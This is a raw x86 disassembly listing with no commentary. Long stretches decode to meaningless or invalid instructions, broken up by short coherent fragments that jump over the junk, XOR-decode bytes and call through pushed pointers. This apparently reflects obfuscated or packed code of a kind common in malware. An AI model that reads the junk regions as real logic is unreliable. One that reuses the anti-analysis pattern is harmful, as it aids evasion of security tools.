  4050cd:	jns    0x4050b5
  4050cf:	dec    ecx
  4050d0:	xor    al,BYTE PTR [edx]
  4050d2:	test   eax,0xe2e8d3d
  4050d7:	pusha  
  4050d8:	and    al,0xbd
  4050da:	xchg   edx,eax
  4050db:	mov    edi,0x7029b73d
  4050e0:	jo     0x4050a3
  4050e2:	sub    eax,0x8432bef
  4050e7:	pop    ecx
  4050e8:	mov    eax,ds:0xde7938d5
  4050ee:	pop    eax
  4050ef:	std    
  4050f0:	popf   
  4050f1:	div    BYTE PTR [edi]
  4050f3:	idiv   BYTE PTR [edi-0x4a]
  4050f6:	add    eax,ebp
  4050f8:	push   0xa8781375
  4050fd:	cmp    eax,0x55f0a1d6
  405102:	clc    
  405103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405104:	mov    ch,0xc6
  405106:	pop    ds
  405107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405108:	scas   eax,DWORD PTR es:[edi]
  405109:	push   eax
  40510a:	fstp   TBYTE PTR [ebx+eax*2-0x6ffa3c0c]
  405111:	mov    ch,0x2
  405113:	sbb    ecx,ebx
  405115:	test   eax,0x35f62485
  40511a:	add    eax,esi
  40511c:	stc    
  40511d:	sub    esp,DWORD PTR [esi+0x72421453]
  405123:	sub    BYTE PTR [esi],0x8a
  405126:	hlt    
  405127:	add    eax,0x3e756afd
  40512c:	outs   dx,DWORD PTR ds:[esi]
  40512d:	aaa    
  40512e:	mov    BYTE PTR [ecx+ebx*8],dl
  405131:	test   BYTE PTR [ebx+0x54],ah
  405134:	sbb    BYTE PTR [ebx],0x37
  405137:	int3   
  405138:	imul   ebx,DWORD PTR [edx+0x73163afe],0x3ee03c98
  405142:	pushf  
  405143:	loopne 0x4050fd
  405145:	dec    ebp
  405146:	dec    ebx
  405147:	cmp    DWORD PTR [ecx+0x7c8b6ed3],edi
  40514d:	call   0xc9c45a97
  405152:	outs   dx,DWORD PTR ds:[esi]
  405153:	xor    BYTE PTR [eax-0x39],dl
  405156:	add    eax,0x412358
  40515b:	adc    BYTE PTR [eax],al
  40515d:	add    BYTE PTR [eax],al
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi-0x72f0698e]
  4051c5:	aad    0x1a
  4051c7:	sbb    al,0x4a
  4051c9:	jo     0x405249
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x40520a
  4051d1:	xor    al,0x8a
  4051d3:	inc    ebx
  4051d4:	mov    edi,0x35c74c3c
  4051d9:	imul   edx,DWORD PTR [edi],0xffffffa1
  4051dc:	inc    esi
  4051dd:	ja     0x40520c
  4051df:	scas   al,BYTE PTR es:[edi]
  4051e0:	mov    ss:0x5d71aade,eax
  4051e6:	aas    
  4051e7:	fadd   QWORD PTR [edx+0x10]
  4051ea:	jl     0x4051f8
  4051ec:	mov    dl,BYTE PTR [ecx+0x2a]
  4051ef:	adc    DWORD PTR [esi+0x62977fbe],esp
  4051f5:	push   edi
  4051f6:	add    DWORD PTR [ebx-0x22],edx
  4051f9:	sbb    dl,BYTE PTR [eax-0x61]
  4051fc:	mov    al,0x15
  4051fe:	cmp    bh,BYTE PTR [esi]
  405200:	je     0xb614aaa5
  405206:	mov    edx,0x8b501962
  40520b:	jb     0x4051a9
  40520d:	add    eax,0xff07722
  405212:	imul   ebx,DWORD PTR [edx],0x651dca27
  405218:	retf   
  405219:	push   ebp
  40521a:	mov    eax,0x65d5cc9f
  40521f:	adc    BYTE PTR [ecx-0x47a3dca4],ch
  405225:	rcl    edi,1
  405227:	push   esi
  405228:	xchg   ecx,eax
  405229:	sahf   
  40522a:	pop    ebx
  40522b:	in     eax,0x91
  40522d:	cmp    BYTE PTR [eax-0x45],0x42
  405231:	stos   BYTE PTR es:[edi],al
  405232:	shr    DWORD PTR [esi-0xd],1
  405235:	sbb    al,0x6d
  405237:	enter  0xa837,0x3d
  40523b:	mov    DWORD PTR [edx+edx*1+0x16],edi
  40523f:	xor    edx,DWORD PTR [ecx+eiz*2+0x7be6508d]
  405246:	inc    esp
  405247:	iret   
  405248:	xchg   ecx,eax
  405249:	push   es
  40524a:	dec    ebp
  40524b:	inc    eax
  40524c:	and    DWORD PTR [edx],0xd8a7197d
  405252:	cmp    al,0x89
  405254:	mov    dl,0x25
  405256:	pop    esi
  405257:	add    BYTE PTR [ecx],bh
  405259:	pop    es
  40525a:	xlat   BYTE PTR ds:[ebx]
  40525b:	and    BYTE PTR [esi+0x6c],ch
  40525e:	pop    esi
  40525f:	jmp    0x3fd79880
  405264:	mov    eax,ds:0x82c3132c
  405269:	fidivr WORD PTR [ecx+0x696b4871]
  40526f:	dec    esi
  405270:	adc    BYTE PTR [ebx-0x35],ah
  405273:	outs   dx,DWORD PTR ds:[esi]
  405274:	fdivr  st,st(1)
  405276:	shl    BYTE PTR [ebp+0x3a],cl
  405279:	neg    ecx
  40527b:	pop    eax
  40527c:	(bad)  
  40527d:	out    0xb1,eax
  40527f:	les    edi,FWORD PTR [eax-0x612480e4]
  405285:	xchg   eax,edi
  405287:	xchg   BYTE PTR [edx-0x62],dl
  40528a:	(bad)  
  40528b:	call   DWORD PTR [ebp-0x26]
  40528e:	shl    cl,cl
  405290:	mov    ebx,0xce991323
  405295:	cmp    eax,0x970a0172
  40529a:	fild   QWORD PTR [edi-0xaba3b54]
  4052a0:	stos   BYTE PTR es:[edi],al
  4052a1:	mov    al,ds:0x7591f3e5
  4052a6:	arpl   WORD PTR [edi-0x4],dx
  4052a9:	cmp    dh,BYTE PTR [ebx-0xc107139]
  4052af:	inc    edi
  4052b0:	pop    edi
  4052b1:	out    dx,al
  4052b2:	dec    edx
  4052b3:	outs   dx,BYTE PTR ds:[esi]
  4052b4:	loop   0x40524f
  4052b6:	inc    ecx
  4052b7:	mov    cs,eax
  4052b9:	mov    al,0xd9
  4052bb:	pop    ecx
  4052bc:	test   BYTE PTR [ebx+eax*1-0xc930b60],cl
  4052c3:	cwde   
  4052c4:	jb     0x405325
  4052c6:	add    ebx,esi
  4052c8:	add    BYTE PTR [ecx],bl
  4052ca:	mov    fs,WORD PTR [edi]
  4052cc:	fcomi  st,st(7)
  4052ce:	and    edi,DWORD PTR [eax]
  4052d0:	adc    BYTE PTR [esi],dl
  4052d2:	fdivrp st(7),st
  4052d4:	in     al,0x7a
  4052d6:	inc    eax
  4052d7:	pop    edx
  4052d8:	cmp    ebx,edi
  4052da:	iret   
  4052db:	mov    cl,0x1
  4052dd:	mov    edx,0x5b0a2451
  4052e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052e3:	cmp    esi,edi
  4052e5:	push   ebp
  4052e6:	mov    BYTE PTR ds:0x7493dc4e,cl
  4052ec:	push   ebx
  4052ed:	stos   DWORD PTR es:[edi],eax
  4052ee:	pop    ebx
  4052ef:	mov    dh,0x2a
  4052f1:	sbb    eax,0xf6233385
  4052f6:	xor    DWORD PTR [eax],esi
  4052f8:	or     ebp,DWORD PTR [edi]
  4052fa:	push   cs
  4052fb:	push   ds
  4052fc:	ret    0xa221
  4052ff:	mov    esp,0x9316871c
  405304:	popa   
  405305:	dec    eax
  405306:	retf   0x2c72
  405309:	popf   
  40530a:	jg     0x4052be
  40530c:	and    al,0xed
  40530e:	adc    DWORD PTR [eax-0x61],0x80590419
  405315:	dec    ecx
  405316:	in     eax,dx
  405317:	popa   
  405318:	cmp    eax,0xe55f1327
  40531d:	cmp    al,0x10
  40531f:	or     al,BYTE PTR [edx+eax*2-0x6f]
  405323:	out    dx,eax
  405324:	aas    
  405325:	mov    DWORD PTR [edi+0x18a4dc61],ebx
  40532b:	mov    dl,0x50
  40532d:	push   DWORD PTR [ebp-0x8]
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	sbb    dl,BYTE PTR [esi-0x33]
  40534e:	std    
  40534f:	push   ss
  405350:	jbe    0x4053d0
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x40538d
  405358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405359:	inc    edi
  40535a:	inc    ebx
  40535b:	jnp    0x4052f7
  40535d:	mov    ah,0x68
  40535f:	imul   eax,DWORD PTR [edx-0x652d099d],0xffccb40e
  405369:	mov    ebp,0xfd371d1e
  40536e:	pop    ss
  40536f:	cs int 0x72
  405372:	push   cs
  405373:	sub    al,BYTE PTR [ebp-0x7b995657]
  405379:	mov    al,ds:0x142b9e67
  40537e:	pop    eax
  40537f:	pop    ss
  405380:	loop   0x405356
  405382:	push   0xc0bb85f2
  405387:	push   edi
  405388:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40538a:	fnsave [ecx]
  40538c:	xchg   ebp,eax
  40538d:	imul   edx,esi,0xdbfd5371
  405393:	push   es
  405394:	stos   DWORD PTR es:[edi],eax
  405395:	call   0xfa6:0x6aa55424
  40539c:	jecxz  0x4053ef
  40539e:	sbb    cl,al
  4053a0:	push   0x72
  4053a2:	pop    ebx
  4053a3:	(bad)  
  4053a4:	sub    eax,0x999cd4b7
  4053a9:	or     DWORD PTR [ebp+0x5b],ecx
  4053ac:	or     dl,BYTE PTR [eax+edi*1-0x6c]
  4053b0:	xchg   edi,eax
  4053b1:	ja     0x405333
  4053b3:	xchg   esp,eax
  4053b4:	and    al,0xa4
  4053b6:	sub    DWORD PTR [edx-0x25],0x695c1ffd
  4053bd:	sbb    edx,DWORD PTR [edx+0x68]
  4053c0:	je     0x405362
  4053c2:	ror    bl,cl
  4053c4:	(bad)  
  4053c5:	cs add eax,0xe8b43141
  4053cb:	or     cl,dl
  4053cd:	ret    0x9cc9
  4053d0:	cs or  eax,0x9e43cb8
  4053d6:	xor    edi,edx
  4053d8:	mov    dl,0x9a
  4053da:	repnz shl BYTE PTR [ebx-0x65eefc48],cl
  4053e1:	mov    dl,0x80
  4053e3:	pop    es
  4053e4:	pop    esi
  4053e5:	lods   eax,DWORD PTR ds:[esi]
  4053e6:	jl     0x4053d7
  4053e8:	push   edi
  4053e9:	and    bl,0x11
  4053ec:	pop    ss
  4053ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053ee:	lds    ebp,FWORD PTR [edx-0x59]
  4053f1:	inc    esi
  4053f2:	stc    
  4053f3:	fwait
  4053f4:	int3   
  4053f5:	sub    eax,0x7bdccd17
  4053fa:	in     al,dx
  4053fb:	jl     0x4053dc
  4053fd:	sahf   
  4053fe:	xchg   DWORD PTR [esi],ecx
  405400:	pop    ecx
  405401:	mov    es,WORD PTR [esi+0x6c36a916]
  405407:	inc    ebx
  405408:	cmp    DWORD PTR [ecx+0x72],esp
  40540b:	rcl    DWORD PTR [ebx+0x7],1
  40540e:	jge    0x405466
  405410:	or     BYTE PTR [ecx-0x28754e86],ch
  405416:	push   cs
  405417:	clc    
  405418:	lock rcl DWORD PTR [ecx-0x721a22b7],cl
  40541f:	mov    ch,0xca
  405421:	out    0xf7,eax
  405423:	push   cx
  405425:	js     0x4053bd
  405427:	repz jo 0x4053cd
  40542a:	pop    ds
  40542b:	(bad)  
  40542c:	rcr    BYTE PTR [ebp+eiz*1-0x3f91a6f3],0xbe
  405434:	dec    ebx
  405435:	mov    ebp,0x44468fc9
  40543a:	ins    DWORD PTR es:[edi],dx
  40543b:	or     BYTE PTR [ebp-0x2c],bh
  40543e:	(bad)  
  405440:	push   ds
  405441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405442:	mov    ecx,0x5136c55e
  405447:	pop    edi
  405448:	pop    esp
  405449:	fs ret 
  40544b:	mov    ecx,DWORD PTR ds:0xf27536fe
  405451:	js     0x405487
  405453:	aaa    
  405454:	test   ebx,ebp
  405456:	in     al,0x4f
  405458:	sahf   
  405459:	repnz cmc 
  40545b:	adc    al,0x90
  40545d:	out    dx,al
  40545e:	mov    DWORD PTR [edx+0x38],esp
  405461:	fistp  WORD PTR [edi+0x3d67c187]
  405467:	popf   
  405468:	aad    0x1a
  40546a:	rcl    DWORD PTR [ecx+0x57],1
  40546d:	fld    st(4)
  40546f:	repz jmp 0x40547e
  405472:	xlat   BYTE PTR ds:[ebx]
  405473:	fisttp WORD PTR [edi+0x24358a6]
  405479:	shl    dh,1
  40547b:	pop    es
  40547c:	sub    al,0x3e
  40547e:	pop    ecx
  40547f:	out    dx,eax
  405480:	enter  0x52e1,0xd8
  405484:	jge    0x4054e9
  405486:	popa   
  405487:	daa    
  405488:	mov    al,ds:0x71ee5bda
  40548d:	jnp    0x4054d9
  40548f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405490:	dec    edi
  405491:	addr16 daa 
  405493:	clc    
  405494:	je     0x40549d
  405496:	aam    0x4
  405498:	mov    dh,0x2f
  40549a:	shr    BYTE PTR [ebx],1
  40549c:	or     ebp,DWORD PTR [eax-0x2019bf09]
  4054a2:	xchg   esp,eax
  4054a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054a4:	sub    esp,ebp
  4054a6:	sahf   
  4054a7:	iret   
  4054a8:	sub    eax,0x11d84248
  4054ad:	dec    ecx
  4054ae:	test   esi,edx
  4054b0:	fstp   QWORD PTR [eax+0x7f]
  4054b3:	call   0x409607
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi+0x52],0xffffffc3
  40550f:	cmp    BYTE PTR [ebx+0x7e7e77f2],0xda
  405516:	jg     0x405596
  405518:	jle    0x40558d
  40551a:	jae    0x405531
  40551c:	scas   eax,DWORD PTR es:[edi]
  40551d:	test   DWORD PTR [ecx-0x220e2c0e],eax
  405523:	sub    BYTE PTR [ebp-0x24],dl
  405526:	jns    0x4054cd
  405528:	adc    al,0xb0
  40552a:	in     al,dx
  40552b:	xchg   esi,eax
  40552c:	jmp    0x4054e3
  40552e:	shl    DWORD PTR [ebx],0x68
  405531:	add    cl,cl
  405533:	je     0x40552d
  405535:	retf   0xfe06
  405538:	dec    eax
  405539:	xor    DWORD PTR fs:0x43998cd9,0xffffff90
  405541:	jbe    0x405547
  405543:	cmp    bl,cl
  405545:	adc    ch,ch
  405547:	dec    esp
  405548:	nop
  405549:	je     0x4054d3
  40554b:	mov    cs,WORD PTR [eax-0x5f8db3a7]
  405551:	(bad)  
  405552:	aad    0x75
  405554:	adc    DWORD PTR [ecx],ebp
  405556:	xchg   ecx,eax
  405557:	push   edx
  405558:	xor    DWORD PTR [ebp-0x74],esp
  40555b:	(bad)  
  40555c:	lock pop esi
  40555e:	add    DWORD PTR [edx+0x77b2f82a],ebp
  405564:	push   ds
  405565:	int    0xaf
  405567:	lock xchg esi,eax
  405569:	mov    ds:0x390b27dc,al
  40556e:	cli    
  40556f:	rcl    BYTE PTR [ecx],cl
  405571:	and    al,0x77
  405573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405574:	fnstcw WORD PTR [edi+0x7b57d1e1]
  40557a:	push   esi
  40557b:	push   ecx
  40557c:	cmp    bh,dh
  40557e:	xor    dl,dh
  405580:	mov    dh,BYTE PTR [eax+0x2530c028]
  405586:	aad    0xa6
  405588:	jge    0x4055c6
  40558a:	(bad)  
  40558b:	sti    
  40558c:	stos   DWORD PTR es:[edi],eax
  40558d:	cli    
  40558e:	fisubr DWORD PTR [edi+edi*4]
  405591:	xor    al,BYTE PTR [edx]
  405593:	sbb    eax,0x9525eb6d
  405598:	lahf   
  405599:	xchg   edi,edi
  40559b:	adc    al,0x0
  40559d:	cmp    DWORD PTR [eax+0x5b],eax
  4055a0:	repnz mov eax,0x432c37cf
  4055a6:	ins    DWORD PTR es:[edi],dx
  4055a7:	inc    eax
  4055a8:	pop    es
  4055a9:	add    BYTE PTR ds:0x9071c607,ah
  4055af:	into   
  4055b0:	test   al,0xd6
  4055b2:	call   0x1fef:0xbcbebb1a
  4055b9:	hlt    
  4055ba:	jg     0x4055a0
  4055bc:	push   ds
  4055bd:	les    edx,FWORD PTR [ebx-0x12]
  4055c0:	pushf  
  4055c1:	mov    BYTE PTR [eax-0x7d],ah
  4055c4:	dec    edx
  4055c5:	stc    
  4055c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055c7:	push   es
  4055c8:	push   ds
  4055c9:	test   eax,0x17d10684
  4055ce:	pop    ecx
  4055cf:	in     eax,dx
  4055d0:	pop    ecx
  4055d1:	sub    BYTE PTR [eax-0x34115833],cl
  4055d7:	rol    edx,cl
  4055d9:	ret    
  4055da:	jmp    0x405652
  4055dc:	mov    al,ds:0xb8e67dc6
  4055e1:	sbb    DWORD PTR [edx-0xa],edx
  4055e4:	aam    0x55
  4055e6:	pusha  
  4055e7:	aad    0xa9
  4055e9:	pop    edi
  4055ea:	or     al,0x8e
  4055ec:	jno    0x405597
  4055ee:	scas   eax,DWORD PTR es:[edi]
  4055ef:	fnsave [edi]
  4055f1:	cmc    
  4055f2:	scas   al,BYTE PTR es:[edi]
  4055f3:	sbb    esi,esp
  4055f5:	(bad)  
  4055f7:	cmp    DWORD PTR [edi],edx
  4055f9:	sub    DWORD PTR [ecx-0x14],ebx
  4055fc:	add    eax,DWORD PTR [edi]
  4055fe:	push   ss
  4055ff:	pushf  
  405600:	and    ch,BYTE PTR [ecx+0x67203256]
  405606:	out    0x72,al
  405608:	repnz in eax,dx
  40560a:	cmp    ecx,DWORD PTR [esi+0x78]
  40560d:	inc    ebx
  40560e:	xchg   ebp,eax
  40560f:	lahf   
  405610:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405612:	jo     0x405663
  405614:	jnp    0x4055a0
  405616:	xchg   edx,eax
  405617:	popf   
  405618:	popf   
  405619:	gs pop edi
  40561b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40561c:	add    eax,0x46e23b10
  405621:	out    dx,eax
  405622:	or     al,0x84
  405624:	mov    BYTE PTR ds:0xc4a8c107,dh
  40562a:	adc    bh,dh
  40562c:	fild   DWORD PTR [ecx-0x609c75ae]
  405632:	pminsw mm3,QWORD PTR [ebx]
  405635:	push   cs
  405636:	push   ss
  405637:	stos   DWORD PTR es:[edi],eax
  405638:	xor    al,0x42
  40563a:	and    al,0x4b
  40563c:	xchg   BYTE PTR [esi-0x298425bc],ah
  405642:	pop    ebp
  405643:	ds mov ch,0xd
  405646:	and    ah,BYTE PTR [edx+0x22]
  405649:	scas   eax,DWORD PTR es:[edi]
  40564a:	jg     0x40566f
  40564c:	inc    edi
  40564e:	mov    edx,0xca2d468c
  405653:	pop    ebx
  405654:	call   0xe21c:0xe933d146
  40565b:	ret    0x1869
  40565e:	dec    ecx
  40565f:	loop   0x405672
  405661:	cli    
  405662:	fs xchg esp,eax
  405664:	fs repz clc 
  405667:	imul   ebp,DWORD PTR [ebx-0x142858cd],0xffffffa4
  40566e:	add    BYTE PTR [ecx+0x5e],ch
  405671:	(bad)  
  405672:	arpl   ax,si
  405674:	jmp    0xff45:0x8a014889
  40567b:	mov    ecx,DWORD PTR [ebp-0x8]
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	enter  0x1065,0x8c
  4056a4:	pop    esi
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x40568d
  4056ad:	scas   al,BYTE PTR es:[edi]
  4056ae:	test   al,0xe2
  4056b0:	mov    edx,0x9acb8ce
  4056b5:	pusha  
  4056b6:	lods   al,BYTE PTR ds:[esi]
  4056b7:	mov    al,BYTE PTR [edi+0x622e9dae]
  4056bd:	dec    edi
  4056be:	push   ebx
  4056bf:	ins    DWORD PTR es:[edi],dx
  4056c0:	in     eax,0x9
  4056c2:	sti    
  4056c3:	add    esi,DWORD PTR [ecx+ebx*2]
  4056c6:	mov    eax,ds:0xdd001073
  4056cb:	adc    cl,BYTE PTR [ebp-0x1a]
  4056ce:	mov    BYTE PTR [eax],dh
  4056d0:	dec    esi
  4056d1:	cmp    cl,bh
  4056d3:	adc    cl,0x8f
  4056d6:	push   0x35
  4056d8:	pop    ecx
  4056d9:	(bad)  
  4056da:	out    0x51,eax
  4056dc:	xchg   edx,eax
  4056dd:	jne    0x40566d
  4056df:	scas   al,BYTE PTR es:[edi]
  4056e0:	popf   
  4056e1:	jb     0x4056f6
  4056e3:	xchg   esi,eax
  4056e4:	data16 test bh,cl
  4056e7:	pop    es
  4056e8:	push   0xffffffac
  4056ea:	mov    esp,DWORD PTR [eax+0x59]
  4056ed:	lods   eax,DWORD PTR ds:[esi]
  4056ee:	jl     0x4056ff
  4056f0:	and    dh,BYTE PTR [esi+ecx*4-0x2a63059a]
  4056f7:	lea    esp,[eax]
  4056f9:	push   edx
  4056fa:	mov    al,ds:0x7d27202f
  4056ff:	loopne 0x4056e8
  405701:	shr    BYTE PTR [ebx],0x27
  405704:	cli    
  405705:	xchg   BYTE PTR [ebx-0x255b9a75],dh
  40570b:	(bad)  
  40570c:	xor    BYTE PTR [esi-0x7e],bl
  40570f:	mov    edi,0xc08219c3
  405714:	mov    esp,0x56ba8302
  405719:	lock loop 0x405765
  40571c:	pop    eax
  40571d:	and    ecx,DWORD PTR [ebx]
  40571f:	cld    
  405720:	add    al,0xb3
  405722:	pop    edx
  405723:	test   DWORD PTR [edi+0x5586bf14],edx
  405729:	in     eax,dx
  40572a:	out    0x32,al
  40572c:	jg     0x405725
  40572e:	ins    BYTE PTR es:[edi],dx
  40572f:	ret    
  405730:	jmp    0x4056f4
  405732:	retf   
  405733:	hlt    
  405734:	mov    al,0x76
  405736:	sbb    BYTE PTR [ecx+0x4e],0xcf
  40573a:	mov    bh,0x2c
  40573c:	cmp    BYTE PTR [esi+0x74],bh
  40573f:	cmp    al,0xa0
  405741:	xor    DWORD PTR [esi+0x7356d3f4],0xc33841e9
  40574b:	(bad)  
  40574c:	fadd   QWORD PTR [edx]
  40574e:	jb     0x4056d3
  405750:	mov    al,0x2
  405752:	or     BYTE PTR [edi+0x79b9626e],ch
  405758:	imul   ebx,DWORD PTR [ecx+ebp*2+0x540233ee],0x5909e90e
  405763:	xor    eax,0xec1b16f2
  405768:	mov    esi,0x4d72f77b
  40576d:	sbb    DWORD PTR [esi+0x2d],eax
  405770:	in     eax,dx
  405771:	lods   eax,DWORD PTR ds:[esi]
  405772:	imul   ecx,DWORD PTR [edi],0x23c653c6
  405778:	test   eax,0x385b66ff
  40577d:	or     DWORD PTR [ebx+0xbe24e84],edi
  405783:	in     eax,dx
  405784:	(bad)  
  405785:	jecxz  0x4057d1
  405787:	call   0x88a1e58b
  40578c:	imul   eax,DWORD PTR [ecx+0x75],0xffffffcc
  405790:	hlt    
  405791:	push   ss
  405792:	jmp    0x5e3a:0x78ff08f5
  405799:	pop    ebx
  40579a:	lods   al,BYTE PTR ds:[esi]
  40579b:	mov    ebx,0x245b3b2c
  4057a0:	loope  0x405805
  4057a2:	mov    ?,WORD PTR [esi-0x7568fda3]
  4057a8:	in     al,0xfa
  4057aa:	sbb    BYTE PTR [eax],ch
  4057ac:	or     eax,0xd5eff999
  4057b1:	cli    
  4057b2:	stc    
  4057b3:	ror    DWORD PTR [edx+0x56],1
  4057b6:	pop    esp
  4057b7:	addr16 xor eax,0x9437529e
  4057bd:	cmp    al,0xc7
  4057bf:	shr    BYTE PTR [edi+eiz*1],cl
  4057c2:	adc    DWORD PTR [edx],esp
  4057c4:	ror    BYTE PTR [edi-0x14778da6],1
  4057ca:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4057cc:	jl     0x40578a
  4057ce:	push   eax
  4057cf:	and    BYTE PTR [edi],cl
  4057d1:	add    edx,DWORD PTR [ebx+edi*4+0x2bf177eb]
  4057d8:	stc    
  4057d9:	bound  edi,QWORD PTR [ebx-0x532a4e84]
  4057df:	in     al,dx
  4057e0:	jno    0x405770
  4057e2:	mov    ebp,0xaac7c69b
  4057e7:	and    al,0x3c
  4057e9:	xor    al,0xd0
  4057eb:	lea    ebx,[edi]
  4057ed:	mov    ebp,0xa4e065bb
  4057f2:	retf   
  4057f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057f4:	xor    esp,esp
  4057f6:	pop    ds
  4057f7:	pop    ebx
  4057f8:	enter  0xe14a,0xe3
  4057fc:	sub    edx,DWORD PTR [edx*4+0x5a239da8]
  405803:	dec    esp
  405804:	jmp    0xfe4c256d
  405809:	or     bh,bh
  40580b:	jne    0x4057fd
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	xchg   esp,eax
  405857:	xchg   BYTE PTR [edi],bl
  405859:	fnstcw WORD PTR [edx]
  40585b:	or     bh,BYTE PTR [esi+0x7e]
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x4057ff
  405863:	nop
  405864:	data16 mov al,0xb9
  405867:	or     dl,dl
  405869:	test   cl,ah
  40586b:	retf   0x78ce
  40586e:	push   esp
  40586f:	fdiv   QWORD PTR [esi+0x5c]
  405872:	(bad)  [edx+0x7e]
  405875:	dec    esi
  405876:	out    0x6a,al
  405878:	cld    
  405879:	dec    esi
  40587a:	adc    eax,0xadd16546
  40587f:	adc    al,0xfa
  405881:	daa    
  405882:	ss push ds
  405884:	xchg   edx,eax
  405885:	stos   DWORD PTR es:[edi],eax
  405886:	icebp  
  405887:	add    bl,BYTE PTR [esi+eiz*1+0x2abd3a87]
  40588e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40588f:	stos   BYTE PTR es:[edi],al
  405890:	ss push ebx
  405892:	cmp    DWORD PTR [esp+eax*4],esp
  405895:	shl    BYTE PTR [edi+0x65],cl
  405898:	(bad)  
  405899:	fadd   st,st(6)
  40589b:	xchg   edx,eax
  40589c:	in     al,0x64
  40589e:	push   0x61
  4058a0:	out    dx,al
  4058a1:	out    dx,eax
  4058a2:	push   0xffffffa0
  4058a4:	sbb    DWORD PTR [edx-0x56],ecx
  4058a7:	jl     0x4058ce
  4058a9:	push   cs
  4058aa:	hlt    
  4058ab:	pop    eax
  4058ac:	push   ds
  4058ad:	dec    eax
  4058ae:	adc    ch,BYTE PTR [edx-0x6cb3fc5]
  4058b4:	xlat   BYTE PTR ds:[ebx]
  4058b5:	pop    ds
  4058b6:	ins    BYTE PTR es:[edi],dx
